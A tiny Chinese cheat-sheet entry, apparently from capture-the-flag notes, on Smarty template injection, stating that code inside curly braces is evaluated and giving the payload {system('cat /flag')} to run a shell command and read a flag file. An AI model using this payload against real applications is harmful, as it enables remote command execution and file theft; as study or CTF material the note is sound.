- ## smarty 模板注入
  
  花括号内可以 eval 命令
  
  ```php
  {system('cat /flag')}
  ```